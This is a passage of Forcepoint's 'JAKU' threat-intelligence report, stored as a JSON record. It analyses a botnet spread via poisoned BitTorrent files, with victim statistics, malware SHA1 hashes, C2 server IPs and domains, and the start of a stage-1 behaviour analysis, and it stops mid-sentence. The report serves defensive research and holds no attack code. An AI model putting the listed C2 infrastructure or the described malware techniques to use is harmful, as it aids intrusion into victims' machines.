{
    "id": "e2ee0945-e4db-45c1-818c-c877d0a4cb5a",
    "created_at": "2022-10-25T16:48:17.435269Z",
    "updated_at": "2025-03-27T02:15:41.673051Z",
    "deleted_at": null,
    "sha1_hash": "6a5001adf44feb6d08eb65ca04370476188965cd",
    "title": "JAKU",
    "authors": "",
    "file_creation_date": "2016-05-04T10:47:38Z",
    "file_modification_date": "2016-05-04T10:47:38Z",
    "file_size": 2284345,
    "plain_text": "**TLP-WHITE** |  1\n\n\n-----\n\n# TABLE OF CONTENTS\n\nExecutive Summary ...................................................................................................................................... 4\nOverview ...................................................................................................................................................... 5\n\nAcknowledgements ................................................................................................................................... 5\nTechnical Analysis ........................................................................................................................................ 6\n\nUnique Victim Computer ........................................................................................................................ 6\nVictims by Languages ........................................................................................................................... 6\nVictims by Country................................................................................................................................. 7\nVictims per Time-zone ........................................................................................................................... 8\nVictims by Network Provider .................................................................................................................. 9\nVictims by Population .......................................................................................................................... 10\nCounterfeit Windows Installations ........................................................................................................ 12\nMalware Version Numbering ............................................................................................................... 12\nTotal Number of JAKU Victims ............................................................................................................ 13\nC2 Servers Locations and Victims ....................................................................................................... 14\nC2 Data Sets ....................................................................................................................................... 15\nTotal Number of JAKU Victims per C2 Server ..................................................................................... 16\nMapping Victim Locations .................................................................................................................... 17\nAmericas and European Coverage ...................................................................................................... 18\nKorean and Japanese Coverage ......................................................................................................... 19\nRussian Coverage ............................................................................................................................... 20\nStatic and Behavioural Analysis .................................................................................................................. 21\n\nMalware Stage 1 – Poisoned Bit Torrent ................................................................................................. 21\n\nStage 1 Behaviour ............................................................................................................................... 21\nWindows Update ................................................................................................................................. 21\nReconnaissance .................................................................................................................................. 21\nCalling Home ....................................................................................................................................... 22\nAwaiting Orders ................................................................................................................................... 22\nMalware Stage 2 – Fake PNG Files ......................................................................................................... 23\n\nEncryption Algorithm ........................................................................................................................... 23\nBad Crypto .......................................................................................................................................... 24\nCompression Algorithm ....................................................................................................................... 24\nMalware Stage 2 – R2D3 ........................................................................................................................ 25\n\nStealth Injection ................................................................................................................................... 25\nAV Engine Detection ........................................................................................................................... 25\nService Installation .............................................................................................................................. 25\nR2D2 ................................................................................................................................................... 25\nR2D3 ................................................................................................................................................... 25\nWinpcap .............................................................................................................................................. 28\nMalware Configuration ......................................................................................................................... 29\nMalware Stage 2 – C3PRO-RACCOON .................................................................................................. 30\n\nC3PRO ................................................................................................................................................ 30\nDNS Command Channel ..................................................................................................................... 32\nObservations on C3PRO-RACCOON ...................................................................................................... 34\n\n**TLP-WHITE** |  2\n\n\n-----\n\nUDT Library ......................................................................................................................................... 34\nSecure Delete ...................................................................................................................................... 34\nUnfinished Code .................................................................................................................................. 34\nSpoofed File Dates .............................................................................................................................. 34\nUnder Development ............................................................................................................................. 34\nWho is SAPHARUS? .................................................................................................................................. 35\n\nSAPHARUS Timeline .......................................................................................................................... 35\nThe Real SAPHARUS ......................................................................................................................... 35\nHypothesis #1 - Overwrites .................................................................................................................. 35\nHypothesis #2 - Additions .................................................................................................................... 35\nSAPHARUS at Forcepoint ................................................................................................................... 35\nDiversity of Addresses ......................................................................................................................... 35\nTruncated System Information ............................................................................................................. 35\nC2 Telemetry Databases ............................................................................................................................ 36\n\nSQLite Databases ............................................................................................................................... 36\nNear.jpg ............................................................................................................................................... 36\nHISTORY Table .................................................................................................................................. 37\nCHILD Table........................................................................................................................................ 38\nINFO Column Commands ................................................................................................................... 38\nParting Thoughts for the Reader ................................................................................................................. 43\n\nAn Exercise to the Reader ....................................................................................................................... 43\nWhy JAKU? ............................................................................................................................................. 43\nReferences ................................................................................................................................................. 44\n\n**TLP-WHITE** |  3\n\n\n-----\n\n# EXECUTIVE SUMMARY\n\n**JAKU is the name given to the investigation, surveillance**\nand analysis, by the Forcepoint Special Investigations\nteam, of an on-going botnet campaign.\n\nOrganised crime has been operating botnets for several\nyears and the term itself has been in common parlance for\nover a decade. While JAKU may not answer all the\nquestions regarding botnets, it does offer some insight and\nunderstanding into the inner workings of a botnet. JAKU\nalso sheds some light onto the victims of botnets, why\nthey are vulnerable, and possibly, why they are targeted.\n\nWhat JAKU demonstrates is the re-use of Infrastructure,\nTools, Techniques and Processes (TTPs), as well as the\nherding of victims into separate groupings; some\nindiscriminate and others highly targeted. Both the herding\nof general botnet victims and highly targeted attacks on\nindividuals and organisations is hardly surprising. What is\nsomewhat of a step change, however, is the execution of\na number of concurrent _operations within a campaign,_\nusing almost identical TTPs, to both herd thousands of\nvictims into becoming botnet members while at the same\n_time executing a targeted operation on a very small_\nnumber of individuals.\n\n\n_Within the noise of thousands of seemingly_\n_indiscriminate botnet victims, the JAKU_\n_campaign performs a separate, highly_\n_targeted operation._\n\n_Forcepoint Security Labs has identified the_\n_precision targeting and tracking of a small_\n_number of individuals of various_\n_nationalities. These individuals include_\n_members of International Non-_\n_Governmental Organisations (NGOs),_\n_Engineering Companies, Academics,_\n_Scientists and Government Employees._\n_North Korea (DPRK) and Pyongyang are_\n_the common theme shared between these_\n_individuals._\n\n_Because of the sensitivity of this part of the_\n_investigation, only the technical details of_\n_the ‘RED-RACOON’ operation are_\n_contained within this report and Law_\n_Enforcement and Government Agencies_\n_have been informed._\n\n\nThis paper examines how the JAKU botnets are constructed and identifies their characteristics, and in the\ncase of the targeted attacks, how they differ from the scattergun attacks of broader botnet activities. This\nstudy also highlights the consequences that Internet users who disregard copyrights and digital rights may\nface. Many may incur end-point security vulnerabilities that may not only leave them subject to attack, but\nalso may allow their machines to be misused by adversaries, such as the JAKU botnet controllers, to\nexecute information and identity theft.\n\nBotnets are an easy form of resilient, redundant and highly pervasive attack infrastructures that are\nrepeatedly deployed by major threat actors, such as organised crime-sponsored attackers and rogue states\nvia their agencies. This resilience is strengthened by what appears to be the herding of victims into smaller\nbot-networks. This, to some degree at least, ensures that if the botnet is compromised then the remainder\nof the campaign is left to operate.\n\nFinding, tracking and shutting down attack modes and methodologies with such capabilities can be a\nformidable task. No single organisation can do it alone. It requires the close collaboration and intelligencesharing activities of both private organisations and government agencies.\n\nFortunately, even before the inception of this investigation in October of 2015, Forcepoint customers\nenjoyed protection from the threats presented by the malware discussed in this paper by TRITON® ACE.\n\n**TLP-WHITE** |  4\n\n\n-----\n\n# OVERVIEW\n\nThe JAKU campaign has clear connections with the TTPs used by the threat actors discussed by\nKaspersky in the DARKHOTEL investigations from November 2014. This paper recognises the extensive\ncontributions by Kaspersky in this area and acknowledges their detailed work.\n\nWhat was not in the public domain and has been identified as part of this investigation, are the following:\n\n**Piracy. The prevalence of users/victims who are running counterfeit installations of Microsoft Windows[®],**\ndownloading ‘warez’ software and using BitTorrent software to illegally obtain these as well as other\ncopyright protected material, such as movies and music.\n\n**C2 Databases. The use of SQLite files to collate and manage the botnet members, their structure and the**\nuse of version numbering.\n\n**Poisoned BitTorrents. The technique of threat actors deploying torrent files onto torrent sites that are pre-**\ninfected with malware has not been widely seen before, especially with respect to BitTorrent-types of\nattack. This behaviour is difficult to trace and track and is indiscriminate in its infection pattern unless it has\nsome means of targeting desired demographics.\n\nResilient C2 Channels. Stage two of one piece of malware has three inbuilt Command and Control (C2)\nmechanisms. This level of resilience is not accidental, but rather, such investment and effort is usually\nindicative of the perceived value of the target.\n\n### ACKNOWLEDGEMENTS\n\nForcepoint would like to thank our colleagues at the UK National Crime Agency (NCA), CERT-UK,\nKrCERT/CC, Europol and Interpol for their cooperation and assistance in this investigation. Only with a\ntruly interactive approach to collaborative intelligence collection, collation and analysis can we, as an\nindustry, ensure that the Internet is a safe place to do business and conduct our personal lives.\nAcknowledgement and thanks to our industry partners and peers who have offered their professional\ninsight\n\nThanks are due to the following individuals, without their contribution and guidance this document would\nnot have been possible: Pierre Boisrond, David Andreas, Josh Douglas, Carl Leonard, Rajiv Motwani,\nEunju Pak, Nigel Roberts, Brian Shirey, Boris Sieklik, Luke Stamp and John Underhill.\n\n**TLP-WHITE** |  5\n\n\n-----\n\n# TECHNICAL ANALYSIS\n\n**Unique Victim Computer. The JAKU servers allocate a unique ID (UID) to every victim. The system tracks**\nvictims by this UID and records the time that the victim ‘calls home’ to the botnet command and control\nserver. Over the period from September 2015 to May 2016, in excess of 29,000 unique victims have been\nrecorded by JAKU. However, the prevalence of duplicate entries in the telemetry data (See: SAPHARUS)\nsuggests that a more realistic figure is closer to 19,000.\n\n**Victims by Languages. The system locale setting within a Windows computer is used to specify the**\nlanguage used when a programme does not understand Unicode characters. In effect, it is the language\nused by the operator of the computer.\n\nThe victims of the JAKU campaign are clearly clustered around the Japanese and Korean languages.\nKorean (43%) and Japanese (30%) make up over 73% of the victim machines, followed by English (13%)\nand Chinese (10%). The remaining 4% of victims are spread across 27 other languages.\n\n**LANGUAGE** **PERCENTAGE** **LANGUAGE** **PERCENTAGE**\n\nKorean 43% Serbian <1%\n\nJapanese 30% Danish <1%\n\nEnglish 13% Thai <1%\n\nChinese 10% Czech <1%\n\nFrench 1% Russian <1%\n\nPolish <1% Lithuanian <1%\n\nPortuguese <1% Greek <1%\n\nSpanish; Castilian <1% Norwegian <1%\n\nGerman <1% Hebrew <1%\n\nItalian <1% Estonian <1%\n\nTurkish <1% Finnish <1%\n\nArabic <1% Macedonian <1%\n\nRomanian; Moldavian; Moldovan <1% Persian <1%\n\nHungarian <1% Dutch; Flemish <1%\n\nCroatian <1% Slovenian <1%\n\nSwedish <1%\n\n**TLP-WHITE** |  6\n\n|LANGUAGE PERCENTAGE|Col2|\n|---|---|\n|Serbian|<1%|\n|Danish|<1%|\n|Thai|<1%|\n|Czech|<1%|\n|Russian|<1%|\n|Lithuanian|<1%|\n|Greek|<1%|\n|Norwegian|<1%|\n|Hebrew|<1%|\n|Estonian|<1%|\n|Finnish|<1%|\n|Macedonian|<1%|\n|Persian|<1%|\n|Dutch; Flemish|<1%|\n|Slovenian|<1%|\n\n|LANGUAGE PERCENTAGE|Col2|\n|---|---|\n|Korean|43%|\n|Japanese|30%|\n|English|13%|\n|Chinese|10%|\n|French|1%|\n|Polish|<1%|\n|Portuguese|<1%|\n|Spanish; Castilian|<1%|\n|German|<1%|\n|Italian|<1%|\n|Turkish|<1%|\n|Arabic|<1%|\n|Romanian; Moldavian; Moldovan|<1%|\n|Hungarian|<1%|\n|Croatian|<1%|\n|Swedish|<1%|\n\n\n-----\n\n**Victims by Country. The JAKU campaign covers the majority of countries**\nacross the world, 134 at the last count. Between September 2015 and May 2016,\nthere were an estimated 19,000 unique victims.\n\nOver 87% of victim computers were in one of four countries: South Korea (42%),\nJapan (31%), China (8%) and the United States (6%). This distribution is\nconsistent with the data from the system locale analysis.\n\n|COUNTRY PERCENTAGE|Col2|\n|---|---|\n|KR|42%|\n|JP|31%|\n|CN|9%|\n|US|6%|\n|TW|2%|\n|IN|1%|\n|CA|1%|\n|ID|1%|\n|HK|1%|\n|MA|1%|\n|GB|1%|\n|PH|1%|\n|PL|1%|\n|MY|1%|\n|OTHERS|<1%|\n\n\n**TLP-WHITE** |  7\n\n\n-----\n\n**Victims per Time-zone. Each of the victim machines has a time-zone setting for the**\ngeographic region the system is configured to operate in. The observed distribution of\ntime-zone settings for the victim computers reinforces the bias towards Korea and\nJapan which both have time-zone offsets of +09:00 (Korea Standard Time, Tokyo\nStandard Time, and Yakutsk Standard Time) at over 69% of victims.\n\nThe only other major grouping of victims is the +08:00 time-zone (China Standard\nTime, Singapore Standard Time, Taipei Standard Time, West Australia Standard\nTime and North Asia East Standard Time) with 11% of all victims.\n\n|TZ OFFSET COUNT|Col2|\n|---|---|\n|-12:00|0.02%|\n|-10:00|0.10%|\n|-09:00|0.04%|\n|-08:00|3.53%|\n|-07:00|0.40%|\n|-06:00|1.26%|\n|-05:00|2.83%|\n|-04:30|0.02%|\n|-04:00|0.12%|\n|-03:30|0.01%|\n|-03:00|0.43%|\n|-02:00|0.01%|\n|-01:00|0.01%|\n|GMT|1.45%|\n|+01:00|2.66%|\n|+02:00|1.08%|\n|+03:00|0.41%|\n|+03:30|0.05%|\n|+04:00|0.10%|\n|+05:00|0.25%|\n|+05:30|1.64%|\n|+05:45|0.03%|\n|+06:00|0.06%|\n|+06:30|0.01%|\n|+07:00|1.88%|\n|+08:00|11.51%|\n|+09:00|69.54%|\n|+09:30|0.04%|\n|+10:00|0.41%|\n|+12:00|0.12%|\n\n\n**TLP-WHITE** |  8\n\n\n-----\n\n**Victims by Network Provider. All IP addresses are controlled within groupings which are sometimes referred**\nto as routing domains. These routing domains are identified by their Autonomous System Numbers (ASN).\nFor the JAKU victims, there is a broad spread of victims across 1,555 ASNs. There is a clear bias on Korean,\nJapanese and Chinese providers:\n\n**NETWORK PROVIDER** **ASNs** **COUNTY** **PERCENTAGE**\n\nKorea Telecom AS4766 Republic of Korea 14.91%\n\nSK Broadband (Hanaro Telecom Inc.) AS9318 Republic of Korea 7.96%\n\nLG Uplus Corp.(LG DACOM Corporation, LG AS17858 (6.25%)\n\nRepublic of Korea 8.38%\n\nPowercomm) AS3786 (2.13%)\n\nNTT Communications Corporation AS4713 Japan 6.54%\n\nKDDI CORPORATION AS2516 Japan 4.70%\n\nChinanet AS4134 People’s Republic of China 3.73%\n\nSoftbank BB Corp. AS17676 Japan 3.44%\n\nOTHERS < 2% (1547) 50.34%\n\n**Corporate Victims. Amongst the JAKU victims, the number of corporate victims is significantly low. The**\nproportion of victim computers that are a member of a Microsoft Windows domain rather than workgroups or\nas standalone systems is less than 1% of the total. This is calculated on just 153 unique victims matching the\ncorporate criteria.\n\n**Dwell Time. The length of time a botnet victim is infected is referred to as the dwell time. For those identified**\nas corporate victims, the mean dwell time is 93 days, with the maximum observed being 348 days.\n\n**TLP-WHITE** |  9\n\n|NETWORK PROVIDER ASNs COUNTY PERCENTAGE|Col2|Col3|Col4|\n|---|---|---|---|\n|Korea Telecom|AS4766|Republic of Korea|14.91%|\n|SK Broadband (Hanaro Telecom Inc.)|AS9318|Republic of Korea|7.96%|\n|LG Uplus Corp.(LG DACOM Corporation, LG Powercomm)|AS17858 (6.25%) AS3786 (2.13%)|Republic of Korea|8.38%|\n|NTT Communications Corporation|AS4713|Japan|6.54%|\n|KDDI CORPORATION|AS2516|Japan|4.70%|\n|Chinanet|AS4134|People’s Republic of China|3.73%|\n|Softbank BB Corp.|AS17676|Japan|3.44%|\n|OTHERS < 2% (1547)|||50.34%|\n\n\n-----\n\n**Victims by Population. If the number of unique victims per country is factored against the population of the**\nrespective countries, a somewhat different picture emerges. Korea and Japan are still at the top of the target\nlist, but Taiwan and Hong Kong rise, while the US and China drop. What is most striking is the clear bias\ntoward South Korean victims:\n\n\nKR\nJP\n\nHK\n\nTW\nSG\n\nMO\nCA\nRS\n\nMA\nNZ\n\nAU\nUS\nLT\n\nMY\nAE\nNL\n\nRO\n\nKW\nIE\n\nPL\n\n\n## Victims per Million Population\n\n162.109\n\n46.234\n\n30.808\n\n13.709\n13.57\n\n11.81\n\n6.781\n\n6.131\n\n4.772\n4.731\n\n3.956\n\n3.575\n3.467\n\n3.212\n3.114\n3.068\n2.908\n2.869\n2.862\n\n2.567\n\n0 20 40 60 80 100 120 140 160 180\n\n|Col1|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|\n|---|---|---|---|---|---|---|---|---|\n|||46.23 808|4||||||\n||||||||||\n||30. .709 .57 81||||||||\n||||||||||\n|13 13 11. 6.781 6.131 4.772 4.731 3.956 3.575 3.467 3.212 3.114 3.068 2.908 2.869 2.862 2.567|||||||||\n\n\n46.234\n\n30.808\n\n13.709\n13.57\n\n11.81\n\n6.781\n\n6.131\n\n4.772\n4.731\n\n3.956\n\n3.575\n3.467\n\n3.212\n3.114\n3.068\n2.908\n2.869\n2.862\n\n2.567\n\n\nListed below are those countries with greater than one victim per million of population:\n\n**COUNTRY** **VICTIMS** **COUNTRY** **POPULATION[1]** **VICTIMS/MILLION**\n\nKR 7962 Korea, South 49115196 162.109\nJP 5868 Japan 126919659 46.234\nHK 220 Hong Kong 7141106 30.808\nTW 321 Taiwan 23415126 13.709\nSG 77 Singapore 5674472 13.57\nMO 7 Macau 592731 11.81\nCA 238 Canada 35099836 6.781\nRS 44 Serbia 7176794 6.131\nMA 159 Morocco 33322699 4.772\nNZ 21 New Zealand 4438393 4.731\nAU 90 Australia 22751014 3.956\n\n1 CIA World Fact Book 2015\n\n**TLP-WHITE** |  10\n\n|COUNTRY VICTIMS COUNTRY POPULATION1 VICTIMS/MILLION|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|KR|7962|Korea, South|49115196|162.109|\n|JP|5868|Japan|126919659|46.234|\n|HK|220|Hong Kong|7141106|30.808|\n|TW|321|Taiwan|23415126|13.709|\n|SG|77|Singapore|5674472|13.57|\n|MO|7|Macau|592731|11.81|\n|CA|238|Canada|35099836|6.781|\n|RS|44|Serbia|7176794|6.131|\n|MA|159|Morocco|33322699|4.772|\n|NZ|21|New Zealand|4438393|4.731|\n|AU|90|Australia|22751014|3.956|\n\n\n-----\n\n|COUNTRY VICTIMS COUNTRY POPULATION1 VICTIMS/MILLION|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|US|1149|United States|321368864|3.575|\n|LT|10|Lithuania|2884433|3.467|\n|MY|98|Malaysia|30513848|3.212|\n|AE|18|United Arab Emirates|5779760|3.114|\n|NL|52|Netherlands|16947904|3.068|\n|RO|63|Romania|21666350|2.908|\n|KW|8|Kuwait|2788534|2.869|\n|IE|14|Ireland|4892305|2.862|\n|PL|99|Poland|38562189|2.567|\n|MK|5|Macedonia|2096015|2.385|\n|SE|23|Sweden|9801616|2.347|\n|QA|5|Qatar|2194817|2.278|\n|GB|134|United Kingdom|64088222|2.091|\n|PT|22|Portugal|10825309|2.032|\n|HR|9|Croatia|4464844|2.016|\n|GR|20|Greece|10775643|1.856|\n|BA|7|Bosnia and Herzegovina|3867055|1.81|\n|PS|5|West Bank|2785366|1.795|\n|DK|10|Denmark|5581503|1.792|\n|AT|15|Austria|8665550|1.731|\n|NO|9|Norway|5207689|1.728|\n|AL|5|Albania|3029278|1.651|\n|TH|94|Thailand|67976405|1.383|\n|SA|38|Saudi Arabia|27752316|1.369|\n|IL|11|Israel|8049314|1.367|\n|HU|13|Hungary|9897541|1.313|\n|CN|1604|China|1367485388|1.173|\n|FR|78|France|66553766|1.172|\n|PH|112|Philippines|100998376|1.109|\n|CZ|11|Czech Republic|10644842|1.033|\n\n\n**TLP-WHITE** |  11\n\n\n-----\n\n**Counterfeit Windows Installations. When an Original Equipment Manufacturer (OEM) installs Microsoft**\nWindows onto a new computer, they use what is known as an OEM product ID (PID). These PIDs can be\nidentified from retail ones as they contain the text, “OEM“. In cases where Windows reports that the ‘model’ of\nthe computer is ‘To be filled by O.E.M.’ and the PID contains OEM, it indicates with some reasonable certainty\nthat an OEM product license has been used on non-OEM hardware. In other words, the system is running a\ncounterfeit Microsoft Windows license.\n\nWith this in mind, the total number of OEM PIDs identified is 12,243. The number of them that appear to be\ncounterfeit is 6,366. For OEM licenses, this indicates that 52% are likely to be counterfeits. It’s reasonable to\nassume that this ratio can be used to infer the prevalence of counterfeits across all the JAKU victims, i.e.\nincluding those with retail PIDs.\n\nThe likelihood that 52% of computers are actually running counterfeit copies of Microsoft Windows warrants\nfurther attention. According to the IDC study, “Unlicensed Software and Cybersecurity Threats” (2015)[2]: “…a\n_clear link between unlicensed software and cybersecurity threats... For enterprises, governments, and_\n_consumers, the obvious implication is that one way to lower cybersecurity risks is to reduce the use of_\n_unlicensed software.” However, the evidence from JAKU paints a clearer picture: Whereas enterprise and_\nlike–sized organizations may well be operating correctly with the licensing of software, there are a sizable\nnumber of other businesses and organizations that are not.\n\nWithin the large number of JAKU victim computers, 75% of Korean machines appear to be running counterfeit\nWindows; for Japan this figure is 25%. Both these percentages are twice the figure stated in the IDC report,\nwhich states that Korea has a piracy rate of 38% and Japan 12%. Not surprisingly, the country with the largest\npercentage of JAKU victims is China, with 85% of computers being suspected of using counterfeit PIDs. This\nis even worse than the estimated 74% of machines in China suspected of running counterfeit Windows in the\nIDC report.\n\n**Malware Version Numbering. During analysis of the malware and the C2 data sets, a version numbering**\nscheme was identified: within the C2 data sets, almost 60 unique version numbers were present. However, for\nthe actual malware artefacts found, only seven unique version numbers were found:\n\n**VERSION** **FILE CHECKSUM**\n\n11 d2f372ace971267c28916ae4cb732aa105fc3b9\n\n12 6b5ca84806966db8a8fc4ab4f84974f140a516a7\n\n22 b305b998d44a319295f66785236735a00996aa36\n\n31 1e1a440ae29d400afa951ed000b4e8010683892f\n\n101 ]               REDACTED               [\n\n140 407cff590a4492f375dc0e9fb41fd7705a482d03\n\n402 8feb968a996cdbebe27cf7dfafb1a51be15e7a3a\n\n2 http://globalstudy.bsa.org/2013/malware/study_malware_en.pdf\n\n**TLP-WHITE** |  12\n\n|VERSION FILE CHECKSUM|Col2|\n|---|---|\n|11|d2f372ace971267c28916ae4cb732aa105fc3b9|\n|12|6b5ca84806966db8a8fc4ab4f84974f140a516a7|\n|22|b305b998d44a319295f66785236735a00996aa36|\n|31|1e1a440ae29d400afa951ed000b4e8010683892f|\n|101|] REDACTED [|\n|140|407cff590a4492f375dc0e9fb41fd7705a482d03|\n|402|8feb968a996cdbebe27cf7dfafb1a51be15e7a3a|\n\n\n-----\n\n**Total Number of JAKU Victims. Over time, the total number of victims has been seen to fluctuate, as victims**\ncome and go. But so, too, do the C2 servers for JAKU. Whole sections of the JAKU victim sets go offline\nbecause their C2 server has also disappeared. Because the malware used has hard-coded domain names\nand not IP addresses, the C2 servers can come back on-line with a new IP address and catch up on their\nexisting victims. Why these servers go offline is not always clear. However, it has certainly been observed on\nat least one occasion that a JAKU server had been compromised by what appeared to be another threat actor\nwishing to use the server for credit card fraud. This situation, however, did not continue for more than a few\ndays.\n\n### Number of total JAKU victim computer/day\n\n20000\n\n18000\n\n16000\n\n14000\n\n12000\n\n10000\n\n8000\n\n6000\n\n4000\n\n2000\n\n0\n\n04/10/2015 04/11/2015 04/12/2015 04/01/2016 04/02/2016 04/03/2016 04/04/2016\n\nTOTAL\n\n**TLP-WHITE** |  13\n\n\n-----\n\n**C2 Servers Locations and Victims. The JAKU Command and Control (C2) servers have been identified as**\nbeing located in Malaysia, Thailand and Singapore:\n\n**C2** **IP** **ASN** **VICTIMS**\n\nBLACK101.99.68.5 AS45839 PIRADIUS NET 5153\nSAPHARUS\n\nAS45144 Net Onboard Sdn Bhd - Quality & Reliable Cloud Hosting\nBLUE-MONKEY 43.252.36.195 3925\nProvider\n\nBROWN-COOPER 103.13.229.20 AS23884 Proimage Engineering and Communication Co., Ltd. 1184\nGREEN27.254.44.207 AS9891 CS LOXINFO Public Company Limited. 327\nSOUNDFIX\n\nGREY-THAI 202.142.223.144 AS7654 Internet Solution & Service Provider Co., Ltd. 3005\nORANGE-HOWL 27.254.96.222 AS9891 CS LOXINFO Public Company Limited. 4204\nPINK-COW 27.254.55.23 AS9891 CS LOXINFO Public Company Limited. 2242\nRED-RACCOON ] REDACTED [ ] REDAC      TED [ 17\nVIOLET-FOX 27.254.96.223 AS9891 CS LOXINFO Public Company Limited. 1187\n\nAS38001 NewMedia Express Pte Ltd. Singapore Web Hosting Service\nYELLOW-BOA 202.150.220.93 3236\nProvider\n\n**TLP-WHITE** |  14\n\n|C2 IP ASN VICTIMS|Col2|Col3|Col4|\n|---|---|---|---|\n|BLACK- SAPHARUS|101.99.68.5|AS45839 PIRADIUS NET|5153|\n|BLUE-MONKEY|43.252.36.195|AS45144 Net Onboard Sdn Bhd - Quality & Reliable Cloud Hosting Provider|3925|\n|BROWN-COOPER|103.13.229.20|AS23884 Proimage Engineering and Communication Co., Ltd.|1184|\n|GREEN- SOUNDFIX|27.254.44.207|AS9891 CS LOXINFO Public Company Limited.|327|\n|GREY-THAI|202.142.223.144|AS7654 Internet Solution & Service Provider Co., Ltd.|3005|\n|ORANGE-HOWL|27.254.96.222|AS9891 CS LOXINFO Public Company Limited.|4204|\n|PINK-COW|27.254.55.23|AS9891 CS LOXINFO Public Company Limited.|2242|\n|RED-RACCOON|] REDACTED [|] REDAC TED [|17|\n|VIOLET-FOX|27.254.96.223|AS9891 CS LOXINFO Public Company Limited.|1187|\n|YELLOW-BOA|202.150.220.93|AS38001 NewMedia Express Pte Ltd. Singapore Web Hosting Service Provider|3236|\n\n\n-----\n\n**C2 Data Sets. The term ‘Data Sets’ is a reference to the JAKU Command and Control (C2) data held in the**\nSQLite databases by each of the active C2 servers. Each IP address identified has a separate Data Set of\nvictims. The following datasets have been identified, observed and analysed.\n\n**NICKNAME** **KNOWN SAMPLE SHA1 (VERSION)** **HARD-CODED C2 NAMEs**\n\nwinchk.bbsindex.com\nbrowny.ddns.net\n\nBLACK-SAPHARUS b305b998d44a319295f66785236735a00996aa36 (22)\n\nsweetbrowny.mooo.com\ncometome.yourtrap.com\n\nBLUE-MONKEY _UNKNOWN_ _UNKNOWN_\n\nbbsbox.strangled.net\nBROWN-COOPER _UNKNOWN_\nminicooper.strangled.net\n\ntorrent.gotgeeks.com\ntorrentfiles.ddns.net\nmovieadd.mooo.com\n\n5d2f372ace971267c28916ae4cb732aa105fc3b9 (11)\n\ntorrent3.bbsindex.com\n\nGREEN-SOUNDFIX\n\ntorrent.gotgeeks.com\n\n6b5ca84806966db8a8fc4ab4f84974f140a516a7 (12)\n\ntorrentfiles.ddns.net\nmovieadd.mooo.com\ntorrent3.bbsindex.com\n\nfile2.strangled.net\nblog3.serveblog.net\n\nORANGE-HOWL 8feb968a996cdbebe27cf7dfafb1a51be15e7a3a (402) torent.dnsd.info\n\ndns53.ignorelist.com\nwww.bbsupdates.comxa.com\n\nVIOLET-FOX _UNKNOWN_ _UNKNOWN_\n\ntorrent.dtdns.net\ndecrypt.dnsd.info\n\nGREY-THAI 407cff590a4492f375dc0e9fb41fd7705a482d03 (140) decrypt.info.tm\n\ntorrent.serveblog.net\ndecrypt.effers.com\n\nboardchk.strangled.net\nminicooper.ddns.com\n\nYELLOW-BOA 1e1a440ae29d400afa951ed000b4e8010683892f (31)\n\nminicooper.chickenkiller.com\ncutemini.sexidude.com\n\nRED-RACCOON ] REDACTED [ ] REDACTED [\n\n_UNKNOWN_\nPINK-COW _UNKNOWN_\n\n**TLP-WHITE** |  15\n\n|NICKNAME KNOWN SAMPLE SHA1 (VERSION) HARD-CODED C2 NAMEs|Col2|Col3|\n|---|---|---|\n|BLACK-SAPHARUS|b305b998d44a319295f66785236735a00996aa36 (22)|winchk.bbsindex.com browny.ddns.net sweetbrowny.mooo.com cometome.yourtrap.com|\n|BLUE-MONKEY|UNKNOWN|UNKNOWN|\n|BROWN-COOPER|UNKNOWN|bbsbox.strangled.net minicooper.strangled.net|\n|GREEN-SOUNDFIX|5d2f372ace971267c28916ae4cb732aa105fc3b9 (11) 6b5ca84806966db8a8fc4ab4f84974f140a516a7 (12)|torrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.com torrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.com|\n|ORANGE-HOWL|8feb968a996cdbebe27cf7dfafb1a51be15e7a3a (402)|file2.strangled.net blog3.serveblog.net torent.dnsd.info dns53.ignorelist.com www.bbsupdates.comxa.com|\n|VIOLET-FOX|UNKNOWN|UNKNOWN|\n|GREY-THAI|407cff590a4492f375dc0e9fb41fd7705a482d03 (140)|torrent.dtdns.net decrypt.dnsd.info decrypt.info.tm torrent.serveblog.net decrypt.effers.com|\n|YELLOW-BOA|1e1a440ae29d400afa951ed000b4e8010683892f (31)|boardchk.strangled.net minicooper.ddns.com minicooper.chickenkiller.com cutemini.sexidude.com|\n|RED-RACCOON|] REDACTED [|] REDACTED [|\n|PINK-COW|UNKNOWN|UNKNOWN|\n\n\n-----\n\n**Total Number of JAKU Victims per C2 Server. Far more complex figures appear when the number of**\nvictims are clustered into their Command and Control (C2) servers and monitored over time. Gaps, such as\nthose illustrated by SAPHARUS, are due to infrastructure problems and servers going offline. Others, such as\nthe YELLOW-BOA disappearance, are far more complex and are possibly due to servers having a take-down\nnotice applied to them by law enforcement.\n\n### Total Number of JAKU Victims per C2 Server\n\n6000\n\n5000\n\n4000\n\n3000\n\n2000\n\n1000\n\n0\n\nOct/2015 Nov/2015 Dec/2015 Jan/2016 Feb/2016 Mar/2016 Apr/2016\n\nBLACK-SAPHARUS BROWN-COOPER GREY-THAI YELLOW-BOA RED-RACOON\n\nGREEN-SOUNDFIX PINK-COW ORANGE-HOWL VIOLET-FOX BLUE-MONKEY\n\n**TLP-WHITE** |  16\n\n\n-----\n\n**Mapping Victim Locations. By using IP to geo-location database services, it’s possible to plot the location of**\nthe JAKU victim machines:\n\n**TLP-WHITE** |  17\n\n\n-----\n\n**Americas and European Coverage. North America and Europe feature significant coverage, but South**\nAmerica and Africa only have limited coverage:\n\n**TLP-WHITE** |  18\n\n\n-----\n\n**Korean and Japanese Coverage. The predominance of JAKU victim machines being located in South Korea**\nand Japan is clearly illustrated:\n\n**TLP-WHITE** |  19\n\n\n-----\n\n**Russian Coverage**\n\n\n**TLP-WHITE** |  20\n\n\n-----\n\n# STATIC AND BEHAVIOURAL ANALYSIS\n\n### MALWARE STAGE 1 – POISONED BIT TORRENT\n\n**Name** Services.exe\n**Origin** Dropped by SoundFix.exe (from poisoned movie and TV\ntorrents)\n**C2 Server** SOUNDFIX\n**Version** 11\n\n**Stage 1 Behaviour. Check HKCU\\CLSID for a default value entry that contains a GUID. This entry is only**\npresent if the malware has already generated and added it to the registry. On first run, this registry value will\nnot be present. If the value already existed, it uses the existing GUID. Otherwise, if HKCU\\CLSID does not\nexist, it generates a new, unique GUID using the CoCreateGUID Windows API. This is then saved under\nHKCU\\CLSID under the (default) value:\n\n**Windows Update. As shown in the picture above, the sample also creates 